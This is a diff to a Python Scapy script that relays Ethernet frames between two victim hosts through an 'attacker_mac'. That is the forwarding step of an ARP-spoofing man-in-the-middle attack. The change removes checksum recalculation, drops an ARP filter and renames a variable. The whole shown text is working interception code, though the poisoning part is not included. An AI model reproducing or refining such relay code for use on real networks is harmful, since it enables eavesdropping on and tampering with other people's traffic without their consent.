@@ -24,7 +24,7 @@ def log_error(msg):
 
 
 def send_packet_info(packet):
-    if packet.haslayer(Ether) and not packet.haslayer(ARP):
+    if packet.haslayer(Ether):
         src = packet[Ether].src.lower()
         dst = packet[Ether].dst.lower()
         with lock:
@@ -46,37 +46,18 @@ def send_packet_info(packet):
                     found = True
 
                 if src == mac1 and dst == attacker_mac:
-                    newpacket = copy.deepcopy(packet)
-                    newpacket[Ether].src = attacker_mac.lower()
-                    newpacket[Ether].dst = mac2
+                    new_packet = copy.deepcopy(packet)
+                    new_packet[Ether].src = attacker_mac.lower()
+                    new_packet[Ether].dst = mac2
 
-                    if IP in newpacket:
-                        del newpacket[IP].chksum
-                    if TCP in newpacket:
-                        del newpacket[TCP].chksum
-                    elif UDP in newpacket:
-                        del newpacket[UDP].chksum
-                    elif newpacket.haslayer(ICMP):
-                        del newpacket[ICMP].chksum
-
-                    sendp(newpacket, iface=conf.iface, verbose=False)
+                    sendp(new_packet, iface=conf.iface, verbose=False)
 
                 elif src == mac2 and dst == attacker_mac:
-                    newpacket = copy.deepcopy(packet)
-                    newpacket[Ether].src = attacker_mac.lower()
-                    newpacket[Ether].dst = mac1
+                    new_packet = copy.deepcopy(packet)
+                    new_packet[Ether].src = attacker_mac.lower()
+                    new_packet[Ether].dst = mac1
 
-                    # Recalculate IP/TCP/UDP checksums if present
-                    if IP in newpacket:
-                        del newpacket[IP].chksum
-                    if TCP in newpacket:
-                        del newpacket[TCP].chksum
-                    elif UDP in newpacket:
-                        del newpacket[UDP].chksum
-                    elif newpacket.haslayer(ICMP):
-                        del newpacket[ICMP].chksum
-
-                    sendp(newpacket, iface=conf.iface, verbose=False)
+                    sendp(new_packet, iface=conf.iface, verbose=False)
 
                 if found:
                     break
